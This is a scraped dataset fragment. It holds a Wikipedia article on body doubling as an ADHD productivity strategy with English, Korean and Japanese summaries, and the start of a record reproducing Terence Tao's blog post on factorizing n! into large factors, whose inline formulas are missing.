#aaa;border-bottom:1px solid #aaa}.mw-parser-output .sidebar-navbar{text-align:right;font-size:115%;padding:0 0.4em 0.4em}.mw-parser-output .sidebar-list-title{padding:0 0.4em;text-align:left;font-weight:bold;line-height:1.6em;font-size:105%}.mw-parser-output .sidebar-list-title-c{padding:0 0.4em;text-align:center;margin:0 3.3em}@media(max-width:640px){body.mediawiki .mw-parser-output .sidebar{width:100%!important;clear:both;float:none!important;margin-left:0!important;margin-right:0!important}}body.skin--responsive .mw-parser-output .sidebar a>img{max-width:none!important}@media screen{html.skin-theme-clientpref-night .mw-parser-output .sidebar:not(.notheme) .sidebar-list-title,html.skin-theme-clientpref-night .mw-parser-output .sidebar:not(.notheme) .sidebar-title-with-pretitle{background:transparent!important}html.skin-theme-clientpref-night .mw-parser-output .sidebar:not(.notheme) .sidebar-title-with-pretitle a{color:var(--color-progressive)!important}}@media screen and (prefers-color-scheme:dark){html.skin-theme-clientpref-os .mw-parser-output .sidebar:not(.notheme) .sidebar-list-title,html.skin-theme-clientpref-os .mw-parser-output .sidebar:not(.notheme) .sidebar-title-with-pretitle{background:transparent!important}html.skin-theme-clientpref-os .mw-parser-output .sidebar:not(.notheme) .sidebar-title-with-pretitle a{color:var(--color-progressive)!important}}@media print{body.ns-0 .mw-parser-output .sidebar{display:none!important}}Disability\nTheory and models\nDisability theory\nAbleism/ Disablism\nMedical model\nSocial model\nOther models\n\nEducation\nMainstreaming\nIndividualized Education Program (IEP)\n\nSpecial needs\nSpecial school\nSpecial education\nLearning disability\n\nTherapy\nPhysical\nOccupational\nSpeech\n\nSocietal implications\nDisability rights movement\nInclusion\nNormalization\nPeople-first language\nPejorative terms\nSexuality and disability\nWomen's health\n\nPersonal assistance\nUnlicensed assistive personnel(ADLs)\n\nAccessible toilet\nAssistive technology\nAssisted living\nMobility aid\nOrthotics and braces\nPhysical accessibility\nProsthetics\nUniversal design\nWeb accessibility\n\nSocioeconomic assistance\nSocial Security Disability Insurance\nSupplemental Security Income\nTicket to Work\nDisability Living Allowance\nDisabled Students' Allowance\nDisabled Persons Railcard\nFreedom Pass\nAssured Income forthe Severely Handicapped\nOntario Disability Support Program\n\nGroupsOrganizations\nNational Telecommuting Institute\nSociety for Disability Studies\nDisabled Peoples' International (DPI)\nVisitability\nWeThe15\n\nParasports\nSpecial Olympics\nParalympic Games\nDeaflympics\nInvictus Games\n\nCulture\nDisability in the arts\nDisability art\nDisability in the media\n\nDisabilityLists.mw-parser-output .navbar{display:inline;font-size:88%;font-weight:normal}.mw-parser-output .navbar-collapse{float:left;text-align:left}.mw-parser-output .navbar-boxtext{word-spacing:0}.mw-parser-output .navbar ul{display:inline-block;white-space:nowrap;line-height:inherit}.mw-parser-output .navbar-brackets::before{margin-right:-0.125em;content:\"[ \"}.mw-parser-output .navbar-brackets::after{margin-left:-0.125em;content:\" ]\"}.mw-parser-output .navbar li{word-spacing:-0.125em}.mw-parser-output .navbar a>span,.mw-parser-output .navbar a>abbr{text-decoration:inherit}.mw-parser-output .navbar-mini abbr{font-variant:small-caps;border-bottom:none;text-decoration:none;cursor:inherit}.mw-parser-output .navbar-ct-full{font-size:114%;margin:0 7em}.mw-parser-output .navbar-ct-mini{font-size:114%;margin:0 4em}html.skin-theme-clientpref-night .mw-parser-output .navbar li a abbr{color:var(--color-base)!important}@media(prefers-color-scheme:dark){html.skin-theme-clientpref-os .mw-parser-output .navbar li a abbr{color:var(--color-base)!important}}@media print{.mw-parser-output .navbar{display:none!important}}vte\nBody doubling or parallel working[1] is a strategy used to initiate and complete tasks, such as household chores or writing and other computer tasks.[2] It involves the physical presence, virtual presence through a phone call, videotelephony or social media presence,[2][3] of someone with whom one shares their goals, which makes it more likely to achieve them.[1] For some people, it works best to both do similar tasks, while for others, just being in the same (virtual) room is enough.[2]\nIt was partially popularized by those with attention deficit hyperactivity disorder (ADHD) to help manage symptoms.[4] Its usefulness has also been noted by those with autism,[2] but efficacy is not clearly known as long term studies have not been conducted on the topic.[2] In 2023, J. Russel Ramsay, professor of clinical psychiatry at the Perelman School of Medicine and co-director of the ADHD treatment and research program of the University of Pennsylvania, noted that, while extensive research on the strategy's effect on productivity doesn't exist, \"the idea of externalizing motivation is a longstanding evidence-based mechanism for managing ADHD.\"[4]\nADHD body doubling comes into play allowing individuals with ADHD to perform and complete tasks more easily and with less distractions, where otherwise they might struggle more. \"ADHD body doubling is a productivity strategy used by individuals with ADHD to finish possibly annoying jobs while having another person beside them.\"[5]\nBody doubling is said to aid individuals with focus and productivity while working. Another person, known as a 'body double' sits alongside the individual with ADHD to help them focus while completing a certain task.[6] The role of this individual is to not partake in the task but, more importantly, serve as a support system and create a welcoming environment that allows the individual to focus by reducing any distractions. The idea of body doubling allows for specific reminders to the individual to stay on task which helps alleviate the symptoms of ADHD.[4]\n\nHistory[edit]\nThe notion of body doubling derives from the cognitive behavioral therapy (CBT) techniques which focus on assisting those with cognitive disorders.[citation needed] Body doubling was first used to alleviate anxiety and improve concentration; recently, it has gained popularity as a way to promote concentration in multiple settings such as schools, home-working environments, and occupations.[6][failed verification]\nTypically, in the 20th century, treatments for ADHD include methylphenidate (Ritalin) and amphetamine mixtures  (Adderall).[7] However, recent studies suggest that body doubling could be a viable alternative rather than the widely used medications.[5] Additionally, individuals with ADHD oftentimes have educational accommodations such as extra time on exams, preferred seating, and breaking down tasks into various steps. The concept of body doubling has been recognized as a new viable option for these pre-existing accommodations.[5] The concept of having an individual close by to provide clear guidance and encouragement will allow the individual with ADHD to stay focused on a particular task should they be partaking in more than one task. It is important that the body double does not distract the other person with conversation or anything else.[4]\n\nMethodology[edit]\nThe individual and body double list specific tasks that they want to complete in a certain amount of time. The body double does not necessarily need to sit shoulder to shoulder with the individual but should provide a calming, nurturing, and quiet presence. The individual is advised not to switch tasks and solely stay focused and work on the task that was assigned.[5]\nSome benefits of body doubling include increasing the individual's accountability, less feelings of isolation, and an increase in motivation.[8] It allows for subtle reinforcement to prevent procrastination and create consistency towards their goals. According to one director of an ADHD counseling practice, \"The idea is that the presence of another is essentially a gentle reminder to stay on task (...) For folks (with) ADHD whose minds tend to wander and get off task, the body double somehow works as an external motivator to stay on task.\"[4]Most importantly, the body double creates a safe and accepting environment where the individual feels the symptoms of ADHD much less; such as criticism or failure.[9]\n\nApplications[edit]\nBody doubling is not used solely for individuals with ADHD. It is now widely used as part of therapeutic settings to assist individuals with autism, anxiety disorders, and other conditions influenced by functioning deficits.[4]\nThis concept is not structured solely for students but for professionals and any individuals who are looking to enhance and optimize their performance. Asking for and applying a body double may come across as awkward however, one could say, \"It's something I heard can help with productivity. Would you mind just being around me while I work on this? Maybe you have something you could work on, too.\"[4]\nExamples of body doubling could include someone asking a person to be on Zoom while they work on something, doing chores while on a phone with their friend, or joining a study group while preparing for a test.[9]\n\nCriticism and limitations[edit]\nWhile body doubling has been seen as an effective tool for alleviating the symptoms of ADHD, many factors come into play in determining whether it is as effective as it is said to be. A variety of factors such as personality types, individual preferences, and the types of tasks at hand can influence the effectiveness of body doubling.Additionally, relying solely on a body double to complete tasks may impact the individual's ability to develop individual working and coping strategies in the future.[citation needed] It is important and necessary for the individual to balance between individual and body double work.[8][failed verification]\n\nSee also[edit]\nProcrastination\nPomodoro Technique\nReferences[edit]\n\n^ a b .mw-parser-output cite.citation{font-style:inherit;word-wrap:break-word}.mw-parser-output .citation q{quotes:\"\\\"\"\"\\\"\"\"'\"\"'\"}.mw-parser-output .citation:target{background-color:rgba(0,127,255,0.133)}.mw-parser-output .id-lock-free.id-lock-free a{background:url(\"//upload.wikimedia.org/wikipedia/commons/6/65/Lock-green.svg\")right 0.1em center/9px no-repeat}.mw-parser-output .id-lock-limited.id-lock-limited a,.mw-parser-output .id-lock-registration.id-lock-registration a{background:url(\"//upload.wikimedia.org/wikipedia/commons/d/d6/Lock-gray-alt-2.svg\")right 0.1em center/9px no-repeat}.mw-parser-output .id-lock-subscription.id-lock-subscription a{background:url(\"//upload.wikimedia.org/wikipedia/commons/a/aa/Lock-red-alt-2.svg\")right 0.1em center/9px no-repeat}.mw-parser-output .cs1-ws-icon a{background:url(\"//upload.wikimedia.org/wikipedia/commons/4/4c/Wikisource-logo.svg\")right 0.1em center/12px no-repeat}body:not(.skin-timeless):not(.skin-minerva) .mw-parser-output .id-lock-free a,body:not(.skin-timeless):not(.skin-minerva) .mw-parser-output .id-lock-limited a,body:not(.skin-timeless):not(.skin-minerva) .mw-parser-output .id-lock-registration a,body:not(.skin-timeless):not(.skin-minerva) .mw-parser-output .id-lock-subscription a,body:not(.skin-timeless):not(.skin-minerva) .mw-parser-output .cs1-ws-icon a{background-size:contain;padding:0 1em 0 0}.mw-parser-output .cs1-code{color:inherit;background:inherit;border:none;padding:inherit}.mw-parser-output .cs1-hidden-error{display:none;color:var(--color-error,#d33)}.mw-parser-output .cs1-visible-error{color:var(--color-error,#d33)}.mw-parser-output .cs1-maint{display:none;color:#085;margin-left:0.3em}.mw-parser-output .cs1-kern-left{padding-left:0.2em}.mw-parser-output .cs1-kern-right{padding-right:0.2em}.mw-parser-output .citation .mw-selflink{font-weight:inherit}@media screen{.mw-parser-output .cs1-format{font-size:95%}html.skin-theme-clientpref-night .mw-parser-output .cs1-maint{color:#18911f}}@media screen and (prefers-color-scheme:dark){html.skin-theme-clientpref-os .mw-parser-output .cs1-maint{color:#18911f}}Berger, Chloe (March 5, 2023). \"Remote workers are adopting a new practice called 'body doubling,' in which they watch strangers work online\". Fortune. Archived from the original on March 5, 2023. Retrieved February 14, 2024.\n\n^ a b c d e Broadwater, Ashley (February 7, 2023). \"How 'Body Doubling' Can Help You Start And Complete Tasks\". HuffPost. Archived from the original on February 14, 2024. Retrieved February 14, 2024.\n\n^ Quinn, Patricia (December 28, 2022). \"Get More Done with a Body Double\". ADDitude. Archived from the original on February 5, 2024. Retrieved February 14, 2024.\n\n^ a b c d e f g Rogers, Kristen (February 13, 2023). \"The benefits of 'body doubling' when you have ADHD, according to experts\". CNN Health. Archived from the original on February 4, 2024. Retrieved February 14, 2024.\n\n^ a b c d \"The Body Double: A Unique Tool for Getting Things Done\". ADDA - Attention Deficit Disorder Association. October 24, 2022. Retrieved April 16, 2024.\n\n^ a b Lovering, Nancy (May 11, 2022). \"ADHD Body Doublin\". Psych Central. Retrieved April 16, 2024.\n\n^ Connolly, JJ (2015). \"ADHD & Pharmacotherapy: Past, Present and Future\". Therapeutic Innovation & Regulatory Science. 49 (5): 632–642. doi:10.1177/2168479015599811. PMC4564067. PMID26366330. The most common and effective medications are methylphenidates and amphetamines.\n\n^ a b \"Could a Body Double Help You Increase Your Productivity?\". Children and Adults with Attention-Deficit/Hyperactivity Disorder (CHADD). Retrieved April 16, 2024.\n\n^ a b Kim, Donna (August 30, 2023). \"Body doubling for ADHD: What it is and how it works\". Understood. Retrieved April 16, 2024.\n\n<img src=\"https://login.wikimedia.org/wiki/Special:CentralAutoLogin/start?useformat=desktop&amp;type=1x1&amp;usesul3=0\" alt=\"\" width=\"1\" height=\"1\" style=\"border: none; position: absolute;\">\nRetrieved from \"https://en.wikipedia.org/w/index.php?title=Body_doubling&oldid=1278940096\"\n\t\t\t\t\tCategories: Attention deficit hyperactivity disorderAttention deficit hyperactivity disorder managementNeurodiversityHidden categories: Articles with short descriptionShort description matches WikidataAll articles with unsourced statementsArticles with unsourced statements from July 2024All articles with failed verificationArticles with failed verification from July 2024",
    "summary": {
      "en": "**Body Doubling Summary**\n\nBody doubling is a strategy where individuals complete tasks with the presence of another person, which can be in person or through virtual means like video calls. This technique is especially helpful for people with ADHD, as it aids in focus and productivity by providing a supportive environment that reduces distractions.\n\nKey points include:\n\n1. **Definition**: Body doubling involves having someone nearby while working on tasks to enhance motivation and accountability.\n   \n2. **Target Audience**: Initially popular among individuals with ADHD, it is also beneficial for those with autism and anxiety disorders.\n\n3. **Method**: The individual and their 'body double' agree on specific tasks to complete within a set time. The body double provides a calming presence without distracting the individual.\n\n4. **Benefits**: Increases motivation, reduces feelings of isolation, and helps individuals stay focused on their tasks.\n\n5. **Applications**: Used in various settings, including schools and workplaces, and can be as simple as working alongside someone on a video call.\n\n6. **Criticism**: Effectiveness can vary based on personal preferences and task types. Relying solely on a body double may hinder the development of individual work strategies.\n\nOverall, body doubling is a supportive approach that can help individuals, particularly those with ADHD, manage their tasks more effectively.",
      "ko": "바디 더블링은 개인이 다른 사람과 함께 작업을 수행하는 전략으로, 이 사람은 직접 만나거나 화상 통화를 통해 존재할 수 있습니다. 이 기법은 ADHD가 있는 사람들에게 특히 유용하며, 주의력을 높이고 생산성을 향상시키는 데 도움을 줍니다. 이는 방해 요소를 줄여주는 지원 환경을 제공하기 때문입니다.\n\n바디 더블링의 주요 내용은 다음과 같습니다. 첫째, 바디 더블링은 작업을 수행할 때 누군가 가까이에 있어 동기 부여와 책임감을 높이는 것입니다. 둘째, 이 방법은 처음에는 ADHD가 있는 사람들 사이에서 인기를 끌었지만, 자폐증이나 불안 장애가 있는 사람들에게도 유익합니다. 셋째, 개인과 그들의 바디 더블은 정해진 시간 내에 완료할 특정 작업에 대해 합의합니다. 바디 더블은 개인을 방해하지 않으면서 안정감을 제공합니다.\n\n바디 더블링의 장점으로는 동기 부여를 증가시키고 고립감을 줄이며, 개인이 작업에 집중할 수 있도록 돕는 것이 있습니다. 이 방법은 학교나 직장 등 다양한 환경에서 사용되며, 화상 통화를 통해 누군가와 함께 작업하는 것처럼 간단할 수 있습니다. 그러나 비판적인 시각도 존재합니다. 효과는 개인의 선호도와 작업 유형에 따라 다를 수 있으며, 바디 더블에만 의존하면 개인의 작업 전략 개발에 방해가 될 수 있습니다.\n\n전반적으로 바디 더블링은 특히 ADHD가 있는 개인이 작업을 보다 효과적으로 관리하는 데 도움을 줄 수 있는 지원적인 접근 방식입니다.",
      "ja": "ボディダブルは、他の人と一緒にタスクを行う戦略で、対面またはビデオ通話などの仮想手段を通じて行われます。この技法は特にADHDの人々に役立ち、集中力や生産性を高めるための支援的な環境を提供し、気を散らす要因を減らします。\n\nボディダブルの定義は、作業中に誰かが近くにいることで、モチベーションや責任感を高めることです。最初はADHDの人々の間で人気がありましたが、自閉症や不安障害を持つ人々にも有益です。\n\nこの方法では、個人とそのボディダブルが特定のタスクを設定した時間内に完了することに合意します。ボディダブルは、気を散らさずに落ち着いた存在を提供します。\n\nボディダブルの利点には、モチベーションの向上、孤独感の軽減、タスクに集中する手助けが含まれます。学校や職場などさまざまな場面で利用されており、ビデオ通話で誰かと一緒に作業するだけでも効果があります。\n\nただし、効果は個人の好みやタスクの種類によって異なることがあります。ボディダブルに頼りすぎると、個々の作業戦略の発展を妨げる可能性もあります。\n\n全体として、ボディダブルは特にADHDの人々がタスクをより効果的に管理するための支援的なアプローチです。"
    }
  },
  {
    "id": "74fec543d154070c",
    "title": {
      "en": "Decomposing a Factorial into Large Factors",
      "ko": "팩토리얼의 큰 인수 분해",
      "ja": "大因子の分解"
    },
    "type": "story",
    "url": "https://terrytao.wordpress.com/2025/03/26/decomposing-a-factorial-into-large-factors/",
    "score": 128,
    "by": "surprisetalk",
    "time": 1743173754,
    "content": "Decomposing a factorial into largefactors\n\t\t26 March, 2025 in math.NT, paper | Tags: Erdos, factorial function, factorisation | by Terence Tao\n\nI’ve just uploaded to the arXiv the paper “Decomposing a factorial into large factors“. This paper studies the quantity , defined as the largest quantity such that it is possible to factorize  into  factors , each of which is at least . The first few values of this sequence are\n (OEIS A034258). For instance, we have , because on the one hand we can factor\n but on the other hand it is not possible to factorize  into nine factors, each of which is  or higher.\n\nThis quantity  was introduced by Erdös, who asked for upper and lower bounds on ; informally, this asks how equitably one can split up  into  factors. When factoring an arbitrary number, this is essentially a variant of the notorious knapsack problem (after taking logarithms), but one can hope that the specific structure of the factorial  can make this particular knapsack-type problem more tractable. Since\n for any putative factorization, we obtain an upper bound\n thanks to the Stirling approximation. At one point, Erdös, Selfridge, and Straus claimed that this upper bound was asymptotically sharp, in the sense that\n as ; informally, this means we can split  into  factors that are (mostly) approximately the same size, when  is large. However, as reported in this later paper, Erdös “believed that Straus had written up our proof… Unfortunately Straus suddenly died and no trace was ever found of his notes. Furthermore, we never could reconstruct our proof, so our assertion now can be called only a conjecture”.\n\nSome further exploration of  was conducted by Guy and Selfridge. There is a simple construction that gives the lower bound\n that comes from starting with the standard factorization  and transferring some powers of  from the later part of the sequence to the earlier part to rebalance the terms somewhat. More precisely, if one removes one power of two from the even numbers between  and , and one additional power of two from the multiples of four between  to , this frees up  powers of two that one can then distribute amongst the numbers up to  to bring them all up to at least  in size. A more complicated procedure involving transferring both powers of  and  then gives the improvement . At this point, however, things got more complicated, and the following conjectures were made by Guy and Selfridge:\n\n  (i) Is  for all ?  (ii) Is  for all ? (At , this conjecture barely fails: .)  (iii) Is  for all ?\n\nIn this note we establish the bounds\n as , where  is the explicit constant\n In particular this recovers the lost result (2). An upper bound of the shape\n for some  was previously conjectured by Erdös and Graham (Erdös problem #391). We conjecture that the upper bound in (3) is sharp, thus\n which is consistent with the above conjectures (i), (ii), (iii) of Guy and Selfridge, although numerically the convergence is somewhat slow.\n\nThe upper bound argument for (3) is simple enough that it could also be modified to establish the first conjecture (i) of Guy and Selfridge; in principle, (ii) and (iii) are now also reducible to a finite computation, but unfortunately the implied constants in the lower bound of (3) are too weak to make this directly feasible. However, it may be possible to now crowdsource the verification of (ii) and (iii) by supplying a suitable set of factorizations to cover medium sized , combined with some effective version of the lower bound argument that can establish  for all  past a certain threshold. The value  singled out by Guy and Selfridge appears to be quite a suitable test case: the constructions I tried fell just a little short of the conjectured threshold of , but it seems barely within reach that a sufficiently efficient rearrangement of factors can work here.\n\nWe now describe the proof of the upper and lower bound in (3). To improve upon the trivial upper bound (1), one can use the large prime factors of . Indeed, every prime  between  and  divides  at least once (and the ones between  and  divide it twice), and any factor  that contains such a factor therefore has to be significantly larger than the benchmark value of . This observation already readily leads to some upper bound of the shape (4) for some ; if one also uses the primes  that are slightly less than  (noting that any multiple of  that exceeds , must in fact exceed ) is what leads to the precise constant .\n\nFor previous lower bound constructions, one started with the initial factorization  and then tried to “improve” this factorization by moving around some of the prime factors. For the lower bound in (3), we start instead with an approximate factorization roughly of the shape\n where  is the target lower bound (so, slightly smaller than ), and  is a moderately sized natural number parameter (we will take , although there is significant flexibility here). If we denote the right-hand side here by , then  is basically a product of  numbers of size at least . It is not literally equal to ; however, an easy application of Legendre’s formula shows that for odd small primes ,  and  have almost exactly the same number of factors of . On the other hand, as  is odd,  contains no factors of , while  contains about  such factors. The prime factorizations of  and  differ somewhat at large primes, but  has slightly more such prime factors as  (about  such factors, in fact). By some careful applications of the prime number theorem, one can tweak some of the large primes appearing in  to make the prime factorization of  and  agree almost exactly, except that  is missing most of the powers of  in , while having some additional large prime factors beyond those contained in  to compensate. With a suitable choice of threshold , one can then replace these excess large prime factors with powers of two to obtain a factorization of  into  terms that are all at least , giving the lower bound.\n\nThe general approach of first locating some approximate factorization of  (where the approximation is in the “adelic” sense of having not just approximately the right magnitude, but also approximately the right number of factors of  for various primes ), and then moving factors around to get an exact factorization of , looks promising for also resolving the conjectures (ii), (iii) mentioned above. For instance, I was numerically able to verify that  by the following procedure:\n\n  Start with the approximate factorization of ,  by . Thus  is the product of  odd numbers, each of which is at least .  Call an odd prime -heavy if it divides  more often than , and -heavy if it divides  more often than . It turns out that there are  more -heavy primes than -heavy primes (counting multiplicity). On the other hand,  contains  powers of , while  has none. This represents the (multi-)set of primes one has to redistribute in order to convert a factorization of  to a factorization of .  Using a greedy algorithm, one can match a -heavy prime  to each -heavy prime  (counting multiplicity) in such a way that  for a small  (in most cases one can make , and often one also has ). If we then replace  in the factorization of  by  for each -heavy prime , this increases  (and does not decrease any of the  factors of ), while eliminating all the -heavy primes. With a somewhat crude matching algorithm, I was able to do this using  of the  powers of  dividing , leaving  powers remaining at my disposal. (I don’t claim that this is the most efficient matching, in terms of powers of two required, but it sufficed.)  There are still  -heavy primes left over in the factorization of (the modified version of) . Replacing each of these primes with , and then distributing the remaining  powers of two arbitrarily, this obtains a factorization of  into  terms, each of which are at least .\n\nHowever, I was not able to adjust parameters to reach  in this manner. Perhaps some readers here who are adept with computers can come up with a more efficient construction to get closer to this bound? If one can find a way to reach this bound, most likely it can be adapted to then resolve conjectures (ii) and (iii) above after some additional numerical effort.\n\nShare this:PrintEmailMoreTwitterFacebookRedditPinterestLike Loading...\n\nRecent Comments\n\t\t\t\t\tTerence Tao on Decomposing a factorial into l…Terence Tao on Large prime gaps and probabili…Terence Tao on Large prime gaps and probabili…alufat on Large prime gaps and probabili…ducduc2710 on Large prime gaps and probabili…Terence Tao on Large prime gaps and probabili…alufat on Large prime gaps and probabili…Terence Tao on Decomposing a factorial into l…Terence Tao on Decomposing a factorial into l…Terence Tao on Decomposing a factorial into l…Anonymous on Decomposing a factorial into l…Anonymous on Decomposing a factorial into l…Anonymous on Decomposing a factorial into l…Anonymous on Analysis ITerence Tao on Decomposing a factorial into l…\n\nTop PostsDecomposing a factorial into large factorsCareer adviceThe three-dimensional Kakeya conjecture, after Wang and ZahlCosmic Distance Ladder videos with Grant Sanderson (3blue1brown): commentary and correctionsAnalysis IBooksOn writingWork hardDoes one have to be a genius to do maths?AboutArchives\n\n\t\t\t\t\tMarch 2025(1)\n\tFebruary 2025(3)\n\tJanuary 2025(1)\n\tDecember 2024(3)\n\tNovember 2024(4)\n\tOctober 2024(1)\n\tSeptember 2024(4)\n\tAugust 2024(3)\n\tJuly 2024(3)\n\tJune 2024(1)\n\tMay 2024(1)\n\tApril 2024(5)\n\tMarch 2024(1)\n\tDecember 2023(2)\n\tNovember 2023(2)\n\tOctober 2023(1)\n\tSeptember 2023(3)\n\tAugust 2023(3)\n\tJune 2023(8)\n\tMay 2023(1)\n\tApril 2023(1)\n\tMarch 2023(2)\n\tFebruary 2023(1)\n\tJanuary 2023(2)\n\tDecember 2022(3)\n\tNovember 2022(3)\n\tOctober 2022(3)\n\tSeptember 2022(1)\n\tJuly 2022(3)\n\tJune 2022(1)\n\tMay 2022(2)\n\tApril 2022(2)\n\tMarch 2022(5)\n\tFebruary 2022(3)\n\tJanuary 2022(1)\n\tDecember 2021(2)\n\tNovember 2021(2)\n\tOctober 2021(1)\n\tSeptember 2021(2)\n\tAugust 2021(1)\n\tJuly 2021(3)\n\tJune 2021(1)\n\tMay 2021(2)\n\tFebruary 2021(6)\n\tJanuary 2021(2)\n\tDecember 2020(4)\n\tNovember 2020(2)\n\tOctober 2020(4)\n\tSeptember 2020(5)\n\tAugust 2020(2)\n\tJuly 2020(2)\n\tJune 2020(1)\n\tMay 2020(2)\n\tApril 2020(3)\n\tMarch 2020(9)\n\tFebruary 2020(1)\n\tJanuary 2020(3)\n\tDecember 2019(4)\n\tNovember 2019(2)\n\tSeptember 2019(2)\n\tAugust 2019(3)\n\tJuly 2019(2)\n\tJune 2019(4)\n\tMay 2019(6)\n\tApril 2019(4)\n\tMarch 2019(2)\n\tFebruary 2019(5)\n\tJanuary 2019(1)\n\tDecember 2018(6)\n\tNovember 2018(2)\n\tOctober 2018(2)\n\tSeptember 2018(5)\n\tAugust 2018(3)\n\tJuly 2018(3)\n\tJune 2018(1)\n\tMay 2018(4)\n\tApril 2018(4)\n\tMarch 2018(5)\n\tFebruary 2018(4)\n\tJanuary 2018(5)\n\tDecember 2017(5)\n\tNovember 2017(3)\n\tOctober 2017(4)\n\tSeptember 2017(4)\n\tAugust 2017(5)\n\tJuly 2017(5)\n\tJune 2017(1)\n\tMay 2017(3)\n\tApril 2017(2)\n\tMarch 2017(3)\n\tFebruary 2017(1)\n\tJanuary 2017(2)\n\tDecember 2016(2)\n\tNovember 2016(2)\n\tOctober 2016(5)\n\tSeptember 2016(4)\n\tAugust 2016(4)\n\tJuly 2016(1)\n\tJune 2016(3)\n\tMay 2016(5)\n\tApril 2016(2)\n\tMarch 2016(6)\n\tFebruary 2016(2)\n\tJanuary 2016(1)\n\tDecember 2015(4)\n\tNovember 2015(6)\n\tOctober 2015(5)\n\tSeptember 2015(5)\n\tAugust 2015(4)\n\tJuly 2015(7)\n\tJune 2015(1)\n\tMay 2015(5)\n\tApril 2015(4)\n\tMarch 2015(3)\n\tFebruary 2015(4)\n\tJanuary 2015(4)\n\tDecember 2014(6)\n\tNovember 2014(5)\n\tOctober 2014(4)\n\tSeptember 2014(3)\n\tAugust 2014(4)\n\tJuly 2014(5)\n\tJune 2014(5)\n\tMay 2014(5)\n\tApril 2014(2)\n\tMarch 2014(4)\n\tFebruary 2014(5)\n\tJanuary 2014(4)\n\tDecember 2013(4)\n\tNovember 2013(5)\n\tOctober 2013(4)\n\tSeptember 2013(5)\n\tAugust 2013(1)\n\tJuly 2013(7)\n\tJune 2013(12)\n\tMay 2013(4)\n\tApril 2013(2)\n\tMarch 2013(2)\n\tFebruary 2013(6)\n\tJanuary 2013(1)\n\tDecember 2012(4)\n\tNovember 2012(7)\n\tOctober 2012(6)\n\tSeptember 2012(4)\n\tAugust 2012(3)\n\tJuly 2012(4)\n\tJune 2012(3)\n\tMay 2012(3)\n\tApril 2012(4)\n\tMarch 2012(5)\n\tFebruary 2012(5)\n\tJanuary 2012(4)\n\tDecember 2011(8)\n\tNovember 2011(8)\n\tOctober 2011(7)\n\tSeptember 2011(6)\n\tAugust 2011(8)\n\tJuly 2011(9)\n\tJune 2011(8)\n\tMay 2011(11)\n\tApril 2011(3)\n\tMarch 2011(10)\n\tFebruary 2011(3)\n\tJanuary 2011(5)\n\tDecember 2010(5)\n\tNovember 2010(6)\n\tOctober 2010(9)\n\tSeptember 2010(9)\n\tAugust 2010(3)\n\tJuly 2010(4)\n\tJune 2010(8)\n\tMay 2010(8)\n\tApril 2010(8)\n\tMarch 2010(8)\n\tFebruary 2010(10)\n\tJanuary 2010(12)\n\tDecember 2009(11)\n\tNovember 2009(8)\n\tOctober 2009(15)\n\tSeptember 2009(6)\n\tAugust 2009(13)\n\tJuly 2009(10)\n\tJune 2009(11)\n\tMay 2009(9)\n\tApril 2009(11)\n\tMarch 2009(14)\n\tFebruary 2009(13)\n\tJanuary 2009(18)\n\tDecember 2008(8)\n\tNovember 2008(9)\n\tOctober 2008(10)\n\tSeptember 2008(5)\n\tAugust 2008(6)\n\tJuly 2008(7)\n\tJune 2008(8)\n\tMay 2008(11)\n\tApril 2008(12)\n\tMarch 2008(12)\n\tFebruary 2008(13)\n\tJanuary 2008(17)\n\tDecember 2007(10)\n\tNovember 2007(9)\n\tOctober 2007(9)\n\tSeptember 2007(7)\n\tAugust 2007(9)\n\tJuly 2007(9)\n\tJune 2007(6)\n\tMay 2007(10)\n\tApril 2007(11)\n\tMarch 2007(9)\n\tFebruary 2007(4)\n\n\t\t\tCategories\n\n\t\t\t\t\texpository (315)\n\n\ttricks (13)\n\n\tguest blog (10)\n\n\tMathematics (885)\n\n\tmath.AC (8)\n\n\tmath.AG (42)\n\n\tmath.AP (114)\n\n\tmath.AT (17)\n\n\tmath.CA (188)\n\n\tmath.CO (197)\n\n\tmath.CT (9)\n\n\tmath.CV (37)\n\n\tmath.DG (37)\n\n\tmath.DS (89)\n\n\tmath.FA (24)\n\n\tmath.GM (14)\n\n\tmath.GN (21)\n\n\tmath.GR (88)\n\n\tmath.GT (16)\n\n\tmath.HO (13)\n\n\tmath.IT (13)\n\n\tmath.LO (53)\n\n\tmath.MG (47)\n\n\tmath.MP (31)\n\n\tmath.NA (24)\n\n\tmath.NT (199)\n\n\tmath.OA (22)\n\n\tmath.PR (109)\n\n\tmath.QA (6)\n\n\tmath.RA (47)\n\n\tmath.RT (21)\n\n\tmath.SG (4)\n\n\tmath.SP (48)\n\n\tmath.ST (11)\n\n\tnon-technical (195)\n\n\tadmin (46)\n\n\tadvertising (66)\n\n\tdiversions (7)\n\n\tmedia (14)\n\n\tjournals (3)\n\n\tobituary (15)\n\n\topinion (36)\n\n\tpaper (253)\n\n\tbook (20)\n\n\tCompanion (13)\n\n\tupdate (23)\n\n\tquestion (127)\n\n\tpolymath (86)\n\n\ttalk (68)\n\n\tDLS (20)\n\n\tteaching (188)\n\n\t245A – Real analysis (11)\n\n\t245B – Real analysis (21)\n\n\t245C – Real analysis (6)\n\n\t246A – complex analysis (11)\n\n\t246B – complex analysis (5)\n\n\t246C – complex analysis (5)\n\n\t247B – Classical Fourier Analysis (5)\n\n\t254A – analytic prime number theory (19)\n\n\t254A – ergodic theory (18)\n\n\t254A – Hilbert's fifth problem (12)\n\n\t254A – Incompressible fluid equations (5)\n\n\t254A – random matrices (14)\n\n\t254B – expansion in groups (8)\n\n\t254B – Higher order Fourier analysis (9)\n\n\t255B – incompressible Euler equations (2)\n\n\t275A – probability theory (6)\n\n\t285G – poincare conjecture (20)\n\n\tLogic reading seminar (8)\n\n\tThe sciences (1)\n\n\ttravel (26)\n\n\t\t\tadditive combinatorics\napproximate groups\narithmetic progressions\nBen Green\nCauchy-Schwarz\nCayley graphs\ncentral limit theorem\nChowla conjecture\ncompressed sensing\ncorrespondence principle\ndistributions\ndivisor function\neigenvalues\nElias Stein\nEmmanuel Breuillard\nentropy\nequidistribution\nergodic theory\nEuler equations\nexponential sums\nfinite fields\nFourier transform\nFreiman's theorem\nGowers uniformity norm\nGowers uniformity norms\ngraph theory\nGromov's theorem\nGUE\nHilbert's fifth problem\nincompressible Euler equations\ninverse conjecture\nJoni Teravainen\nKaisa Matomaki\nKakeya conjecture\nLie algebras\nLie groups\nLiouville function\nLittlewood-Offord problem\nMaksym Radziwill\nMobius function\nmultiplicative functions\nNavier-Stokes equations\nnilpotent groups\nnilsequences\nnonstandard analysis\nparity problem\nPaul Erdos\npolitics\npolymath1\npolymath8\nPolymath15\npolynomial method\npolynomials\nprime gaps\nprime numbers\nprime number theorem\nrandom 